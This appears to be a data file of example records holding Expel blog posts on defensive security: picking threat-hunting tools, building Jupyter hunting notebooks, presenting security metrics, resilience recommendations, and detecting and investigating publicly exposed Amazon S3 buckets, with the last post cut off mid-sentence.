  Example({'title': 'How to choose the right security tech for threat hunting', 'url': 'https://expel.com/blog/how-to-choose-right-security-tech-for-threat-hunting/', 'date': 'Jun 4, 2019', 'contents': 'Subscribe  EXPEL BLOG How to choose the right security tech for threat hunting Security operations  7 MIN READ  ANDREW PRITCHETT  JUN 4, 2019  TAGS: Get technical / How to / Hunting / SOC / Tools Before joining Expel, I worked as a police officer in Alaska and spent my days focused on digital forensics. I loved combing through heaps of forensic data to find that one photo or text message to seal the case. There were more than a few cases where, after serving a warrant and seizing equipment, we had an entire rack of computers, phones and media storage devices waiting for analysis. I jumped right in, eager to see where the data would take me, and then Id click on the start button to kick off that analysis. Several hours later, Id return and see that only a portion of the processing actually completed. But finding that one hidden gem required countless hours of string searching, regular expression searching, hash matching, dissecting sqlite data and plists, or searching through hex for header byte sequences. When Im digging through a mountain of data looking for evidence of a crime, or poking around trying to find an unauthorized login on a companys network, threat hunting feels the same  its still that proverbial needle in a haystack-type task. Although my old school version of threat hunting was more bows and arrows than NCIS, the goal of threat hunting today is still to separate the needle from the haystack  where the needle is an unauthorized activity and the haystack is business as usual within the network. Today, there are lots of shiny tools at your disposal to use for threat hunting. But how do you decide which is right for your hunt? And will using multiple technologies speed up or slow down your hunt? Or does it depend on what youre hunting for? If youve already got the basics of threat hunting down and know what youll be looking for, here are some tips on how to choose the right weapon (er, tech) to carry out your hunt. (Psst: If youre new to threat hunting and are looking for more info on what threat hunting is and if its right for your org, then you should read this post first.) Choosing the right weapon tool OPTION 1: USE YOUR EXISTING SIEM Use this technique when Youre looking for a low-cost, low-investment method of hunting, or when youre just testing the waters to see if threat hunting is something you (and your team, if youre lucky enough to have one) want to explore for your org. This method is especially useful when you dont have a development team at your disposal. If youre using your SIEM as your primary hunting tool, consider testing hunt techniques where you can aggregate multiple data sources. For example, when hunting for suspicious remote logins, you could correlate event logs, sysmon and firewall logs by time, user and source IP address into a single event. Then you can easily review the source reputation, authentication, and immediate processes performed to give greater decision support. Pros: Many SIEMs support the creation of custom dashboards, saved recurring queries, custom alerting and even custom triage workflows, such as Sumo Logic, Splunk, and Exabeam, so you can continually tweak and adjust your dashboards or queries. By using your existing SIEM to hunt, its easy to roll your findings into finely tuned detections. As you discover true findings and learn what they look like, use your dashboards to look for specific indicators like domains, IPs and hashes that have helped you identify true findings in the past. Some SIEMs have great APIs where you can export data in order to augment that with other data sources elsewhere, such as OSINT or public/private intel APIs. Cons: There are a few downsides to using your SIEM for hunting. First, youre often limited by the types of data available from your SIEM, and the SIEMs retention rates which may be determined by corporate policy. For example, if you have data type X and Y but also need Z and your SIEM doesnt have it, then youre missing an important piece of the threat hunting puzzle. At some organizations security administrators will happily make changes to SIEM data sources, while others will make you jump through hoops to get that additional API data fed into the SIEM. Also, it can be hard to enrich SIEM data with things like open source intel, public/private intel APIs or endpoint tech data. Some orgs have gotten around this by having multiple SIEM environments that are governed by different corporate policies. The downside of using multiple SIEMs? Threat hunting gets a lot more expensive. OPTION 2: USE YOUR EXISTING ENDPOINT DETECTION AND RESPONSE (EDR) TECH Use this technique when Youre targeting specific behavioral patterns of attackers on endpoints and you have some development support for your team. Using EDR tech for threat hunting can be a great start but in order to get even more out of hunting with an EDR tech, youll need to do some work to take advantage of that EDR techs data. Over the years, Ive seen a lot of orgs waste resources by hunting in their EDR tech for open source indicators. Dont fall into that trap! Automate this task with saved queries and make sure that your EDR tool isnt already configured to do this work for you. Dont waste your time creating queries for known malware hashes your EDR tech is already designed to alert on. Instead, take advantage of the EDRs rich monitoring capability and create queries that focus on behavioral frameworks such as the MITRE ATT&amp;CK Framework . Hunting should augment your detections and help fill gaps, not create extra or redundant triage work for you. Pros: Some EDR technologies like Tanium and Endgame allow you to rapidly query a targeted set of hosts and return a wealth of information from process executions with command line and process relationships with hashes. Carbon Black Response and CrowdStrike Falcon have phenomenal detail in describing process events and capture persistence commands, registry modifications, file modifications and network connections. Many EDR technologies today offer super detailed and targeted views of your endpoints. A good API, such as Carbon Blacks or Endgames, allows you to target and export very specific process details from a large number of hosts, and fast. Cons: Its not always easy to get the data that you need from your EDR. Youll need some way to export the data or pull it via API, a way to store it and a way to work with it. This could make it difficult for you to stack, sort and filter large volumes of hunt data  which means you cant enrich your hunt data with OSINT, public/private APIs or data from your SIEM. You also need to be sure that your EDR is retaining the data that you need (or that youre storing it elsewhere). If not, youre limited to hunting in short intervals or in real-time. OPTION 3: SECURITY TECH CONSOLE HUNTING Use this technique when You dont have a SIEM or any EDR tech. Console hunting is a technique where you log into a particular security tech console like Palo Alto Networks or SentinelOne and hunt through the specific data provided through that console. For example, you could log into your firewall console and search for anomalous traffic. Though this technique might get results over time, its labor intensive. Ive seen some analysts fall into the trap of aimlessly clicking around in the hopes of finding a gem within the data. This usually turns into a waste of time. If you want to use your console for hunting, heres a pro tip: outline a few guidelines to keep your analysts focused on gap analysis detection. The goal here is to identify what your security tech is not already alerting on. How can you leverage the visibility of your tech to detect behavioral indicators not yet being alerted on? Security tech alert review should take place in a separate workflow outside of hunting. Pros: If you already own some security tech and your analysts know how to use those tools, this is a super cost-effective option. Having a well-defined hunt to maintain your focus will keep you out of the analysis traps I mentioned above. Cons: Many security tools have less-than-great UIs. In my experience, the flashier and more futuristic the UI is, the less useful they really are and the more cumbersome they become to actually use. When it comes to using security tech for hunting, youre usually limited to the UI capabilities in the console. Generally, each security console looks at a limited scope of a specific aspect of your security posture. So if youre using your console for hunting, export your console data (if you can) so that you can manipulate it further, or feed it into a SIEM if you have one and enrich that data with data from other sources. At the very least, exporting that data into your SIEM will give you more searching, sorting, and filtering options than your consoles UI will. OPTION 4: USING A CUSTOM SCRIPTING INTERPRETER Use this technique when You dont have a SIEM or EDR tech, or when you want to enrich data from your SIEM or EDR tech. Custom scripting will require you to build out some custom tools or research and implement an open-source build found online. FYI, if youre going this route then make sure you have dev support, or at least a team member whos comfortable writing scripts. Pros: You can interface with any security tech with an available API and even enrich hunt data with OSINT and public/private intel APIs. Also, if you dont have an EDR, you can collect data using lots of available open-source projects like PowerForensics or OSQuery . With Powershell Remoting, SSH or EDR technologies you can collect raw data for parsing/analysis and hunt for the presence of specific forensic artifacts. Open-source projects such as Jupyter can ingest, parse, table and plot large volumes of collected data and provide really great decision support for your analysts. Cons: The flexibility here is sometimes outweighed by draining your resources. Creating your own custom hunt often requires lots of resources  namely people and time. Carefully structure your hunt, verify that you have permissions to carry out the hunt as described and the development support to engineer the code and execute it securely. (Pro tip: Dont create a super awesome forensics and data collection tool for your next attacker!) Getting started with threat hunting There are lots of things to think about when you create a hunting program. Beyond just selecting the tech youll use, spend some time thinking about your goals and the resources you already have at your disposal. Will you need anything else to execute a program successfully? A new tool, or help from your engineering team? Jot down those considerations before you dive into threat hunting. Interested in threat hunting but dont have the resources to carry it out on your own? Drop us a note  wed love to help.'}) (input_keys={'title'}),
  Example({'title': 'How to create and maintain Jupyter threat hunting notebooks', 'url': 'https://expel.com/blog/how-to-create-maintain-jupyter-threat-hunting-notebooks/', 'date': 'Jun 16, 2020', 'contents': 'Subscribe  EXPEL BLOG How to create and maintain Jupyter threat hunting notebooks Tips  6 MIN READ  ANDREW PRITCHETT  JUN 16, 2020  TAGS: Get technical / Guide / Hunting / Managed detection and response / SOC / Threat hunting / Tools Expel recently had the privilege of participating in Infosec Jupyterthon . It was an awesome opportunity to share what were learning about this open-source technology as well as learning from others about what theyre finding, and unique perspectives on how to up our game in efficiency when it comes to incorporating this technology into infosec processes. Following our presentation, which you can check out here , a few participants reached out to me to ask about our process for developing and maintaining an entire library of threat hunting notebooks. In the spirit of sharing with the open-source community, I wanted to write a detailed response thats available to everyone. We believe that hunting is content that can and should be developed by subject matter experts (SMEs), and our best SMEs for hunt development are our SOC analysts. The job of engineering is to set up systems to enable those SMEs to focus on the parts of the problem that are relevant  like enabling really simple code deployment by linking GitHub and our CI/CD pipeline with JupyterHub (we wrote about that here ). Another example is using a shared chassis for all of our notebooks, allowing for sharing and reuse of boiler-plate components like API access, analyst notes and report formatting (we also wrote about that here ). By focusing efforts on these things as enabling technologies, our analysts can focus on building hunting techniques and analytics rather than worrying about barriers to deployment. Building off my last blog post , I thought Id cover how we use configuration files to build and configure our hunting notebooks, which allows our analysts to build new hunting notebooks without requiring them to learn Python. Going on the hunt So how do we do it? Im going to share a Hello world! type example to demonstrate our implementation of this framework. But you can check out the complete source code here . Our goal behind the source code is to make it easy for our analysts to generate notebooks based on a standard template, yet allow each of the notebooks enough flexibility to provide unique capabilities required for a specific technique. For example, some of our hunts are based on network artifacts while other hunts are based on process artifacts or cloud platform API usage. Hunts based on network artifacts may have specific capabilities related to reverse DNS, IP address attribution or host to source traffic patterns. However, a process artifact hunt may require different capabilities such as hash reputation lookups and parent/child process relationship patterns. We need to keep the development simple and ensure that all our notebooks have the common capabilities yet allow the flexibility for our analysts to configure the specific capabilities they need to analyze and report on their hunting data sets. In order to do that, were going to use yaml files to store easily modifiable configurations, and then build the notebooks from those configurations using the nbformat package in Python following five steps (plus one optional step). Step 1: Configure Docker I started off by configuring a working directory. In my example, I used a Docker container as my engine to run my build. I like using Docker because I can preconfigure my dependencies and anyone with Docker can later run my same build without having to configure any of their own dependencies. To get started with Docker , create a Dockerfile or use the example from my source code. Otherwise, make sure you have Python v.3.5+ installed as well as nbformat and PyYAML . Step 2: Create Configuration Directory Next, I created a directory to store my YAML configuration files. In my source code example, I used the hunt_configs directory. I have two example hunts in this directory right now (see below); however, you can have as many configuration files as youd like. Each configuration file builds a new hunting notebook. Configuration file directory Step 3: Create YAML Configuration Files I then created a few YAML configuration files and created some key value pairs that I need in order to give my notebooks their unique characteristics and tools. Each configuration file builds a new hunting notebook. Once you create the file, itll look something like this: YAML configuration file data Repeat step three as many times as you need to make sure you have enough notebooks for your hunting technique library. Step 4: Adjust the Build Script for Your Use Time for the Python builder script. I named my script notebook_builder.py. You can name your script anything you want, just make sure that if youre using Docker, you update the filename in the Docker configuration files. This builder script is what reads the configuration files and generates our Jupyter notebook files (*.ipynb files). The primary function in this script is run_builder(). First, this function needs to be able to find the current working directory and the directory which contains all of your YAML configuration files: Code to locate configuration files Second, the function will iterate over each of our configuration files so we ensure that we make a unique build for each configuration file. See an example below. Code to iterate over configuration files The function will then give our new notebook object a variable name. This is also where we can add any global metadata and create a new list to store all of the cells were about to build. In the example below, Im using notebook metadata to hide the code cell input from view. I generally like to hide the code cell input so the user experience in Jupyter is more like a web application rather than a Python script. Code to build notebook object From here forward, we repeat the process of building and appending cells to our notebook cells list. There are many options for building your notebooks, including the ability to append new_code_cell or new_markdown_cell. Any data you want to be evaluated by your Jupyter notebook needs to be written in as string data. In this example, I want to import the Pandas package into my notebook. To do this, Ill append a new_code_cell with the string value import pandas. If I want to print Hello world! Ill append a new_code_cell with the string value print(Hello World!). Nbformat provides helpful docs for more advanced use cases. Writing code into a notebook cell To insert data into our notebook, all we need to do is reference the data from our YAML file and insert the data using either the f-string or format string methods, like this: f-string example Format string example Our example hunting notebooks all have a title, a data normalization function, a Start Hunt button, a decision support section and a hunt data visualizer. The bottom section of the notebook is where each notebook takes on its unique characteristics. In the bottom section, weve assembled a set of capabilities to assist with the analysis of the specific hunting techniques. These capabilities live in the  downselects.py  module. At Expel, we call these capabilities downselects. Downselects are designed to help our analysts break down the larger hunting technique theory into smaller sub-theories or subsets of information. We believe this helps to break down the find a needle in the haystack approach to hunting. We also use downselects to provide analysts specific tools they will need to triage their hunting results. Downselects can be enrichment lookups like VirusTotal or Greynoise, or graphs and charts to visually display data in different aspects, or timelines and tables that focus on a specific sub-theory. When the analyst discovers interesting events or patterns in the downselects, they are armed with pivot points to triage and scope the larger dataset, rather than tearing through the dataset aimlessly. To learn more about how we use downselects, checkout our Jupyterthon presentation here . In order to access our downselects and build them into our notebooks, our builder script needs to iterate through a list of our downselects: Code example to iterate through list of dictionary objects We can then insert the function name and parameters from  downselects.py  as a string into a new_code_cell: Image: code example to execute function specified in YAML config file Lastly, our script needs to write our notebook object to a unique file name; otherwise, it will keep writing over the same filename as it iterates over our configuration files. Code example to write notebook So now we have the instructions written in order to build our new hunting notebooks. Lets build and run them in Jupyter! Step 5: Build and Run Our Hunting Notebooks So now we have the instructions written in order to build our new hunting notebooks. Lets build and run them in Jupyter! The Docker instructions are designed to build the hunting notebooks when you run the Jupyter notebook service, using this command: docker-compose run service-ports notebook. Command line example of build process When we use the Jupyter notebook link, we can see our newly created notebook files in our file tree. Jupyter notebook server and new hunting notebooks Select one of the *.ipynb files to view the hunting technique notebook in Jupyter. Example of running built notebook If you need to make a change to one specific notebook or hunting technique, all you need to do is update the specific configuration file for the technique and re-run the notebook service to rebuild the notebooks. If you need to make a change to your core code base, you can modify your notebook_builder.py build script and re-run the notebook service. This way you can ensure that your notebooks will be rebuilt the same way and will run on the latest version of the build. Optional last step (a bonus!): Add to Deployment Pipeline If your organization has a pipeline for continuous integration, such as using CircleCI , your organization can configure the build to run following your change review process. This ensures that your end users are always working off of the latest deployment of your notebooks. Final thoughts Whether youre using notebooks for customer analytics, performance analytics, data science, threat hunting, sales projections or machine learning, Jupyter notebooks can be really helpful for sharing, presenting and collaborating on data. We hope this post helps take some of the time and stress out of managing your notebooks and allows you more time to actually engage with your data. Huge shout out to everyone who helped put Infosec Jupyterthon 2020 together and to the attendees who gave me the inspiration to write this post. The event was a blast, and we hope to see you all again soon! Have more questions? Let us know !'}) (input_keys={'title'}),
  Example({'title': 'How to create (and share) good cybersecurity metrics', 'url': 'https://expel.com/blog/how-to-create-and-share-good-cybersecurity-metrics/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG How to create (and share) good cybersecurity metrics Tips  6 MIN READ  MATT PETERS  MAR 2, 2021  TAGS: MDR / Metrics If you search for how to measure cybersecurity or cybersecurity metrics, youll wind up with an endless list of resources that all claim to have the definitive collection of metrics you should use to measure your cybersecurity program. Im not going to specifically tell you what you should measure. The devil is in the details  every process has its hidden complexities that keep any one size fits all approach from working particularly well. Instead, Im going to share my perspective on what you need to bring to that metrics meeting in order to have a productive, meaningful conversation about the business. How I think about cybersecurity metrics (and why) When I think about talking about metrics, my mind naturally moves to art history. As a thought experiment  take a look at this painting. If youre not an art history enthusiast, you may just go, Wow, that thing is bananas! This is a pretty common reaction  perception overload. If I try to explain the painting by saying, Hey, thats Medusas head right in the middle there, the problem actually gets worse  now youre trying to figure out why Medusas head is there. Wasnt that in a movie or something?!? Its not that much different attending a slide-driven metrics meeting if were not on our game. How to measure cybersecurity Start with context Its the understanding here thats missing, which is critical. Whether its art history or metrics, we cant engage the brains of our audience unless we give them some context to connect with. With art, it might be that we just miss out on enjoying a painting, but with metrics, we make decisions based on that (possibly flawed) understanding. Instead of diving right in, what if I introduced the painting to you with this? This oil painting by Sebastiano Ricci is a good example of 18th century Italian painting. It depicts a scene from Greek mythology. During the wedding between Perseus and Andromeda, the happy couple was attacked by a mob led by a jilted suitor. Perseus, located in the center of the image is using the severed head of Medusa (whom he earlier bested in combat to win the hand of Andromeda) to turn some of his attackers to stone. This is seen on the far right of the image, as two of the attacking figures are statues. The attack is ongoing, as seen by the bodies of the wedding guests scattered in the foreground. The painting makes heavy use of diagonal posing to give the impression of movement and action and is a good representation of the late baroque period, where the use of chiaroscuro, or the interaction between light and dark tones in a painting were used to convey mood and meaning. Now the painting starts to make sense. Its amazing how much detail we can spot once we have a framework to hang the detail on. Now that we know what to look for, we might even notice that one of the attacking soldiers is in the process of being turned to stone, as his arm is half grey and half normal color. In the description of the painting, we provided a brief introduction of who painted the thing, and when. This gives the audience a second to adjust their expectations. If I said, this is a neolithic cave painting, and then showed you this painting, the reaction wouldve been stark. In the context of metrics, this usually sounds like: Were watching our mean-time-to-remediate because its key to understanding if our team is overloaded. How to measure cybersecurity: Articulate the questions you want to answer As youre thinking about the context you want to offer during the metrics discussion, think about the questions you want answered (or the questions and answers the group might expect of you). For example: Are these metrics of particular importance? What story do the metrics tell us? How did we collect them and from what process? Why do you need two minutes of time to talk about this? We started with an introduction: This is a painting of. followed by introducing the main characters and offering some smaller details. We want to move through the scene with multiple passes, each pass having slightly more detail than the last. We dont start with, Look, its Medusas head! When talking about a cybersecurity metrics, this might sound like: This is a graph of [X], you can see that generally its [Y]. One thing to note is [Z]. Studying the data and the graph can help you pinpoint any trends or oddities you might want to share as youre offering context. For example: Whats the scale of the graph? Are there two scales? Call that out. Is there a trendline we need to be aware of? Are there multiple lines? If so, why? How to measure cybersecurity: Add structure to the discussion Once your audience has the general sense of whats going on, move on to the big stuff. Lets use our painting example again. The foreground is dead bodies, the right side is people being turned to stone. This is how the audience is going to get a sense of whats going on. In a metrics presentation, this might sound like: Youll notice the overall trend is increasing for the period or We saw a sharp dip, followed by a recovery The questions youll likely want to think about here are big structures in the graph: Is it periodic? If so, why? Is there a trend? Are there any big dips or spikes? What do we not see that we were expecting? (e.g. Normally were 2x this rate, but not this month because..) How to measure cybersecurity: But what does it mean? At the end of the description I shared with you, I talked about why this painting was important  its a good example of the baroque period. The idea is that this part is the invitation for us to consider something larger about the painting  above the reach of the characters and the action. But why do we care? In a metrics conversation, it sounds like: What does this mean? What are we going to do about it? Without these questions and answers, metrics are just another nice graph. Questions you want to think about here are: If theres a trend, what does it relate to? Is it a natural phenomena? Do we expect it to stop? If there are big spikes, what happened? Are they good or bad for business? Do I need to be worried, excited or just informed about what Im seeing? This is usually where people get stuck. If youre having trouble coming up with the meaning of the metric or graph, ask yourself two things: What would it take for us to change the value of the metric over the next day/week/quarter? Would we want to? If you cant answer those two questions, its likely youre showing a metric that isnt all that useful. What to avoid during your metrics discussion In a metrics meeting, avoid reading data, titles or legends off the graph  instead, dive into the context. What I didnt do when describing the painting is say, The painting is of a large room. At 10 oclock you can see through a window to the outside, which is lighter Avoid the temptation to use words to describe what people will see. Use words to help them see something they cant see. Were trying to understand what the painter was trying to communicate, not what they painted. In Baroque art, the artists were experimenting with the use of light and dark colors. You can see this at 10 oclock in this painting, where the view outside is light, contrasting with the dark scene in the room. How do you know youre doing it right? What all of this translates to when presenting metrics is a combination of audience engagement and identifying or taking next steps. If youre on the right track, people will: Ask questions about what youre presenting. (This is usually a good sign, unless their question is: What the hell?) Interact with the structure of the metric with an eye toward meaning. This might sound like: I see this in the graph, what causes it? or Is the uptick here a cause for concern? What does this look like in practice? If were doing our job well, then our metrics meetings will sing and our business will prosper. Lets ditch the painting example and share a real-life example of a metric our team recently presented to our colleagues. What we see below is a time series of the number of unique submissions to our phishing service for the last two months. The counts are given at a weekly granularity, where phishing campaigns consisting of more than one email are rolled up into a single count. The overall trend-line, here plotted in grey, is showing a steady increase  this is expected, as weve added a number of new departments over the period. We also see that the variance is increasing  the high/low swings increase in size over the back half of the period. We believe this is due to new departments being added over the holiday period. This effect should smooth out over the next few months. Example phishing submissions graph What makes all of that useful? Context: I told you what it was a graph of. I didnt tell you the high and low watermark  you can read that. But I did tell you what the numbers meant and how we calculated them. Multiple passes: I told you about the line and what its doing, as well as the trend line and what its about. Structures and functions: I called attention to the mean and the variance, which are both increasing. Meaning: I told you why the mean and variance were increasing, and what you should think about that. Want to read more of our thoughts on cybersecurity metrics, and how we apply some of this thinking in measuring our own Security Operations Center (SOC)? Check out this post and this post.'}) (input_keys={'title'}),
  Example({'title': 'How to disrupt attackers and enable defenders using ...', 'url': 'https://expel.com/blog/how-to-use-resilience/', 'date': 'Feb 8, 2018', 'contents': 'Subscribe  EXPEL BLOG How to disrupt attackers and enable defenders using resilience Tips  3 MIN READ  GRANT OVIATT  FEB 8, 2018  TAGS: How to / Managed security / Mission by Grant Oviatt, Ben Brigida, Jon Hencinski We think its important for your managed security service providers (MSSP) interests to align with yours. Unfortunately, thats not always the case. Its easy to fall into the trap (that many MSSPs do) of measuring their value by just pointing to the number of alerts they review and incident reports they produce. But what if threats dont show up on any given Tuesday? Well, among other things, it can shine a spotlight on how misaligned your interests can become and it can lead to a discussion that goes something like this: Customer: Im not getting (m)any alerts. What am I paying you for? MSSP: Hold on a sec. [turns knob to send more low-priority alerts to customer] . Are you getting more alerts now? Customer: Ummm yeah. Do you really want to get more alerts and more incidents if you arent more compromised (if that sounds familiar check out our post on 5 warning signs your MSSP isnt the right fit )? We dont think a managed security provider should be off the hook for delivering value just because things are quiet. Finding bad things is critical. But in our view, detection is only half of the equation. We think a managed security service should make your security better, not busier. And getting better means preventing bad things from happening again (and again) or impacting you in the first place. To do that, you need two things: First, you need a way to identify the root causes of incidents and assess risk (beyond the occasional red team exercise) Second, you need the data to make the case for change (even to people who dont speak security) Thats why we created resilience. What is resilience? Resilience is our way of making you better even when there arent any security incidents. At its core, resilience is comprised of recommendations that describe: A specific security risk The potential impact, and The steps to mitigate it Resilience recommendations do one of two things  disrupt attackers or enable defenders. Recommendations that disrupt attackers prevent threats from successfully performing their intended goal, while recommendations that enable defenders allow your team (including us) to respond more effectively when they do. Resilience recommendations cover a broad spectrum of security content from Windows settings that reduce the exposure of plain text credentials in-memory to specific configurations for getting the most out of your firewall or endpoint detection and response (EDR) solution. Resilience in action So now youve heard a little bit about what resilience is lets talk about how it works. Step 1. Find the root cause and identify how to improve Lets say Expel detects commodity malware on a host in your environment. Wed validate the event, and notify you. Thats where most MSSPs would stop. But well investigate that activity using your technology to understand how the host was infected and provide remediation steps to remove the problem at hand. In the example above, it turns out the host was compromised when a user downloaded and opened an MS Word document with an embedded macro from a phishing email link. This is where most managed detection and response (MDR) providers would stop. Its also where resilience kicks in to tell you how this incident could have been prevented altogether. In this case, we found the attack wouldve been disrupted if macros were blocked in MS Office files downloaded from the Internet. We also noticed that your defenders could have responded faster if the Palo Alto Networks firewalls had a URL filtering license. The additional license would have allowed us to detect or block maliciously categorized URLs like the phishing link (who says that identifying risk has to be just a pentesting thing?). Where things become more interesting is when you start to tie a bunch of incidents to the same resilience recommendation. Now you can start building a fact-based case for doing something about it  as long as youre armed with the right data. Step 2: Arm yourself with data It probably isnt news to you that blocking MS Office macros is a good idea. We know how hard it can be to implement changes like this in your environment  especially when there are other business units involved in the decision (talking about you IT). Making the case to get it done is half the battle. To help with that we give you a tear sheet for each resilience recommendation. It contains data from your environment and anonymized data from other customers that shows the cost (and risk) of doing nothing about a recommendation. How many of your systems have been impacted? How much time has been spent fixing problems that could have been prevented by addressing the root cause? How have others fared when implementing this recommendation? Conclusion / Executables So thats a quick overview of how we approach resilience here at Expel. Call us crazy but we just dont think that being compromised should be a prerequisite for getting value out of your MSSP. That said, you dont need Expel to put resilience into practice. Here are a couple resilience recommendations our customers have implemented recently to start you off on the path towards security improvement. Resilience example #1: Disrupt attackers Mitigate Microsoft Group Policy Preferences (GPP) vulnerability Resilience example #2: Enable defenders Configure Palo Alto Networks Firewalls to block or alert on C2 URL traffic'}) (input_keys={'title'}),
  Example({'title': 'How to find Amazon S3 bucket misconfigurations and fix ...', 'url': 'https://expel.com/blog/find-amazon-s3-bucket-misconfigurations-fix-them/', 'date': 'Mar 6, 2019', 'contents': 'Subscribe  EXPEL BLOG How to find Amazon S3 bucket misconfigurations and fix them ASAP Tips  8 MIN READ  PETER MICHALSKI  MAR 6, 2019  TAGS: Cloud security / Get technical / How to / SOC / Tools Many of our customers run at least part of their infrastructure in public cloud environments, like Amazon Web Services (AWS) , Google Cloud or Microsoft Azure . And while there are plenty of benefits of using the cloud, there are also unique security concerns that organizations need to be aware of. In short, that same security playbook you were using to chase down alerts on your network, laptops and servers isnt always going to work once youve lifted that data into the cloud. Why? Weve talked about a few reasons here , but the TL;DR is that your users are the new endpoints. One of the biggest challenges we see with cloud security is that people are unpredictable and prone to, well  ya know, being human . So we often see security incidents happen that are simply errors made by well-intending employees. While they mean well, these errors can (and do) inadvertently put their organization at risk. One of the most common errors thats been popping up in the news and which weve started to see here at Expel is when users accidentally make Amazon S3 buckets public. Whats Amazon S3, why do these breaches happen and how can you protect your own org from making this mistake? Were laying out all the details for you below. What is Amazon S3? Amazon S3 (S3 stands for Simple Storage Service, BTW) buckets are basically the equivalent of hard drives in the sky. They can be used to store images, videos, websites, backups, new application builds or really anything you want. You can even host a website using Amazon S3, and store all the elements on said website in a bucket. When you create a new Amazon S3 bucket, youve got to set a bunch of configurations and settings. You can also adjust the access permissions policies for the bucket and all the data contained in it (more info on all of that right here ). S3 buckets dont allow public access by default, so if a bucket becomes public, it means a user made a change somewhere along the way. The potential for exposing data through public S3 buckets will always be a risk (even if its unintended), but there are a couple steps you can take to quickly identify public-facing S3 buckets and reduce your risk of an incident. Understanding a few details about S3 buckets  along with some red flags to look out for when users inevitably make them public  can go a long way towards keeping your org safe. Why do Amazon S3 buckets often wind up public? The short answer? Confusing naming and well-meaning users. Lets tackle the tricky naming convention first. S3 buckets become public when any permissions are granted to the predefined groups AuthenticatedUsers or AllUsers. The AuthenticatedUsers group represents all AWS accounts, meaning anyone with an AWS account can access that S3 bucket. The AllUsers group consists of anyone in the world  and ya cant get much more public than that. Its easy to see how this can cause confusion  especially if youre new to cloud. Developers and IT admins have grown up in an (on premise) world where groups with users in the name are limited to only the employees in their organization. So when Joe over in IT accidentally gives AllUsers access to the company directory and unwittingly exposes it to anyone with an internet connection, it doesnt mean hes a dummy. Well-meaning users is another common way that data stored in S3 buckets becomes public. For example, think about an engineer whos trying to test something and assigns a bucket to AuthenticatedUsers so her new teammate can get quick access to it  but then forgets to change the settings back. Or perhaps a team member was testing different permissions but they were never reverted. Or maybe the bucket was never configured properly in the first place. You get the idea. There are lots of ways that S3 buckets can become public. How to detect, investigate and respond to Amazon S3 alerts We see a lot of our customers forwarding their AWS logs to a SIEM, which is what we use to query and spot Amazon S3 bucket misconfigurations. This isnt the only approach but if youre interested heres an explanation to get started using Sumo . Alternatively you can use Amazon Elasticsearch Service to implement alerting, and there are other options as well. Once set up, you can search for AWS events which contain indicators that an S3 bucket was made public. Weve outlined one approach on how to do this below but as those auto ads say your mileage may vary. Depending on your tech and how your logs are stored, some of the terms we use may not be the same but should still give you a good idea of what to look for. The first step is to query for the PutBucketAcl event. This event notes when access control lists (ACL) are used to grant permissions on an existing bucket. Next, youll need to narrow your search so it only focuses on buckets that have been made public. You can do this by searching for one or both of the predefined S3 Groups as follows, http://acs.amazonaws.com/groups/global/AuthenticatedUsers http://acs.amazonaws.com/groups/global/AllUsers From there, youll need to sift through to get the necessary info. Below are the fields thatll give you the most useful information to get started with your investigation along with a sample value. userName: liza sourceIPAddress: xx.xx.xx.xx bucketName: fix-it-dear-henry URI: http://acs.amazonaws.com/groups/global/AllUsers Permission: WRITE_ACP Now youve got all the important investigative leads youll need to get started. Based on the information youve pulled from the logs, youll know the following: The user performing the action The source of the activity The bucket thats being made public The group (such as AllUsers) that was granted access The permissions that were set for that bucket. Four red flags we look for when we investigate S3 alerts Now that youve got the data, youre probably wondering what type of user behavior can tip you off when something fishy is going on with an S3 bucket? Based on our experience investigating Amazon S3 alerts, here are four red flags  big and small  that we watch for at our customers: 1. Suspicious source IP If the source IP responsible for an ACL change is coming from a network hosting provider for virtual private networks (VPN) such as IPVanish, thats strange. Youd expect an employee to be configuring their S3 bucket settings from a known ISP, or at the very least a commonly seen VPN IP. An IP thats located in another country could (depending on your company) raise eyebrows. 2. Unusual user behavior A username in your AWS logs (which will look something like userName: Henry.Liza@Corp[.]com or arn:aws:iam::XXXXXXXXXXXX:user/Henry.Liza@Corp[.]com) will help you identify who in your org is making these changes. If the user is in development operations, production support or another administrative role then maybe its okay that theyre making configuration changes  but its definitely worth checking. Alternatively, maybe their role doesnt fit into one of the categories I described above. In that case, youll want to figure out why and how the user has these rights. Go search that users past activity. Timelining their recent activity can provide a lot of useful information and context. 3. Interesting bucket names People usually name S3 buckets based on the types of information they put in them. So one way to figure out if an S3 bucket might have sensitive information is to simply look at its name. For example, one S3 bucket we recently investigated had kops state in the name and the permission level was set to READ. (If youre not familiar, a quick Google search would reveal that kops is a tool used to configure Kubernetes clusters .) The state refers to the information needed to manage those clusters, such as configurations and the keys the org is using to do so. Thats not something you want the general public to be able to access! 4. Unnecessary user permissions granted S3 buckets will have one of five permission types. Three of these are particularly noteworthy: READ, WRITE and FULL_CONTROL. The FULL_CONTROL permission level gives users the abilities associated with the other four permissions, such as to list the objects in the bucket (READ), to edit any object in the bucket (WRITE) and more. The permission(s) granted, coupled with the bucket name, will help you gauge the severity and risk. Amazon S3-related Expel alerts in real life: a quick case study Here at Expel, we recently detected an S3 bucket at one of our customers that was open to the public. Heres what the investigation looked like  It started with an alert in the Expel Workbench that looked like this: You can see that the Expel Workbench has already parsed out Source IP and Username (two of the four red flags we identified above). In addition you can see that when this user made the S3 bucket clevername[.]com public, they set the permission level to READ. At first glance this seems pretty benign. Wouldnt you want an S3 bucket that appears to hold a website (based on the name, that is) to be public? We collect a lot of context from our customers to help us prioritize the severity of alerts. In this case, we were able to use that context to quickly identify the source IP. It was from the customers known public address space. If we didnt have this context, we could have searched for the IP to see if it was used anywhere else in the customers environment. Next, we queried for the users recent activity. It turns out that earlier that day, this user had created an S3 bucket with the event CreateBucket. We also saw that the user issued other commands such as GetBucketWebsite, PutBucketWebsite, GetBucketAcl and others. The evidence pointed to legitimate user activity  someone was trying to host a website using S3 buckets and test the access controls. Scanning through the logs, it looked like the user was checking and configuring the buckets access controls and policies through commands like GetBucketPolicyStatus and PutBucketAcl. We found that the user ultimately deleted the bucket. And by using some open source intelligence (OSINT)  also known as LinkedIn and Google  we discovered that the user worked in a DevOps role for the customer and that the name of the bucket he made public matched the name of an annual charitable event that our customer was hosting. A new IP was stood up that same day with a similar name, which pointed to that bucket. Based on this intel, we concluded that the user was preparing for the launch of this charitable event, possibly testing for the anticipated influx of new website traffic that the customer usually gets around the time of year that they host this benefit. After digging deeper, we safely closed this investigation without having to notify the customer. The public S3 bucket in question was deleted, and the users activity was related to legitimate web hosting purposes. How to put a lid on your 